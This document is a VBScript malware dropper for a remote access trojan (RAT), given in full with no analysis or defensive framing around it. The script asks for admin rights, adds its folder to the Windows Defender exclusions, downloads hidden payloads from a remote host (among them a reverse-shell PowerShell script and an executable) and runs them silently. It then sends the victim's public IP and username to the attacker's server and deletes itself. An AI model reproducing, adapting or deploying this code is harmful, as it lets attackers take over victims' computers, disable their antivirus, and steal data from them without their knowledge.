Set objShell = CreateObject("Shell.Application")

' If no arguments are passed, we request elevated privileges
If WScript.Arguments.Count = 0 Then
    objShell.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34) & " uac_launched", "", "runas", 1
ElseIf WScript.Arguments(0) = "uac_launched" Then
    ' Admin privileges granted, continue with the script

    ' Get the temporary directory path
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    strTempDir = objFSO.GetSpecialFolder(2).Path

    ' Generate a random folder name (alphanumeric)
    strFolderName = ""
    For i = 1 To 7
        Randomize
        intCharCode = Int((75 * Rnd) + 48)
        If intCharCode > 57 And intCharCode < 65 Then
            intCharCode = intCharCode + 7
        End If
        If intCharCode > 90 And intCharCode < 97 Then
            intCharCode = intCharCode + 6
        End If
        strFolderName = strFolderName & Chr(intCharCode)
    Next

    ' Create the full folder path
    strMainFolderPath = strTempDir & "\" & strFolderName

    ' Create the folder
    On Error Resume Next
    objFSO.CreateFolder strMainFolderPath
    If Err.Number <> 0 Then
        'WScript.Echo "Error creating folder: " & Err.Description
        Err.Clear
        WScript.Quit ' Exit if folder creation fails
    End If
    On Error GoTo 0

'//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    ' Add the folder to Windows Defender exclusions (PowerShell) - Hidden Window
    strPowerShellCommand = "powershell.exe -Command ""Add-MpPreference -ExclusionPath '" & strMainFolderPath & "'"""
    objShell.ShellExecute "powershell.exe", "-WindowStyle Hidden -Command """ & strPowerShellCommand & """", "", "runas", 0
    If Err.Number <> 0 Then
        'WScript.Echo "Error adding exclusion: " & Err.Description
        Err.Clear
    Else
        'WScript.Echo "Folder successfully excluded from Windows Defender."
    End If
'//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    ' Array of files to download (***REPLACE WITH YOUR URLS AND FILENAMES***)
    arrFiles = Array( _
        Array("https://arth.imbeddex.com/RAT/hello.vbs", "hello.vbs"), _
        Array("https://arth.imbeddex.com/RAT/del.vbs", "del.vbs"), _
        Array("https://arth.imbeddex.com/RAT/target_script.exe", "target_script.exe"), _
        Array("https://arth.imbeddex.com/RAT/Rev_shell.ps1", "Rev_shell.ps1") _
    )

    ' Loop through the files to download
    For Each arrFile In arrFiles
        strURL = arrFile(0)
        strLocalFile = arrFile(1)
        strLocalPath = strMainFolderPath & "\" & strLocalFile

        ' Download the file
        Set objHTTP = CreateObject("MSXML2.XMLHTTP")
        objHTTP.open "GET", strURL, False
        objHTTP.send

        If objHTTP.status = 200 Then
            Set objStream = CreateObject("ADODB.Stream")
            objStream.Type = 1 ' adTypeBinary
            objStream.Open
            objStream.Write objHTTP.responseBody
            objStream.SaveToFile strLocalPath, 2 ' adSaveCreateOverWrite
            objStream.Close
            Set objStream = Nothing

            'WScript.Echo "File downloaded successfully to: " & strLocalPath

            ' Set the hidden attribute (VBScript method)
            objFSO.GetFile(strLocalPath).Attributes = 2 ' 2 = Hidden attribute
            If Err.Number <> 0 Then
                'WScript.Echo "Error setting hidden attribute: " & Err.Description
                Err.Clear
            Else
                'WScript.Echo "File hidden."
            End If
        Else
            'WScript.Echo "Failed to download file: " & strURL
        End If
    Next
'//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    ' Set the file name to execute
    strExecutableFileName = "target_script.exe" ' The name of the file to execute

    ' Loop through downloaded files and check if it's the one we need to execute
    For Each arrFile In arrFiles
        strLocalFile = arrFile(1)
        If LCase(strLocalFile) = LCase(strExecutableFileName) Then ' Case-insensitive comparison
            strLocalPath = strMainFolderPath & "\" & strLocalFile

            ' Execute the downloaded file
            objShell.ShellExecute "cmd.exe", "/C """ & strLocalPath & """ >nul 2>&1", strMainFolderPath, "runas", 0
            If Err.Number <> 0 Then
                'WScript.Echo "Error running downloaded file: " & Err.Description
                Err.Clear
            Else
                'WScript.Echo "Downloaded file executed."
            End If
        End If
    Next
'//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    Set objXMLHttp = CreateObject("MSXML2.XMLHTTP")
    Set objWScriptShell = CreateObject("WScript.Shell")
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    
    ' Get ip
    objXMLHttp.open "GET", "http://api.ipify.org", False
    objXMLHttp.send
    strPublicIP = objXMLHttp.responseText
 
    Const ssfSTARTUP = &H7
    Set oShell = CreateObject("Shell.Application")
    Set startupFolder = oShell.NameSpace(ssfSTARTUP)
    If Not startupFolder Is Nothing Then
        startupFolderPath = startupFolder.Self.Path
    End If

    strUsername = objWScriptShell.ExpandEnvironmentStrings("%USERNAME%")

    ' Function to read the file content
    Function ReadFile(filePath)
        Dim fso, file, content
        Set fso = CreateObject("Scripting.FileSystemObject")
        Set file = fso.OpenTextFile(filePath, 1)
        content = file.ReadAll
        file.Close
        ReadFile = content
    End Function

    ' Create and open the text file in the same directory as the script
    Set objFile = objFSO.CreateTextFile(strMainFolderPath & "\details.txt", True)
    objFSO.GetFile(strMainFolderPath & "\details.txt").Attributes = 2 ' 2 = Hidden attribute

    objFile.WriteLine "IP: " & strPublicIP & " User: " & strUsername
    objFile.WriteLine "MainDir: " & strMainFolderPath
    objFile.Close

    ' Upload the details.txt file
    Dim filePath, url, xmlhttp, formData
    filePath = strMainFolderPath & "\details.txt"
    url = "https://arth.imbeddex.com/RAT/index.php"

    ' Create XMLHTTP object
    Set xmlhttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")

    ' Open the connection
    xmlhttp.Open "POST", url, False

    ' Create form data
    formData = "target_name.rat" & vbCrLf
    formData = formData & ReadFile(filePath) & vbCrLf

    ' Send the request
    xmlhttp.send formData

'//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    objFSO.DeleteFile(strMainFolderPath & "\details.txt")

    ' Schedule the deletion of the script after a delay
    strScriptPath = WScript.ScriptFullName
    objShell.ShellExecute "cmd.exe", "/C del """ & strScriptPath & """", "", "", 0
'//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
End If
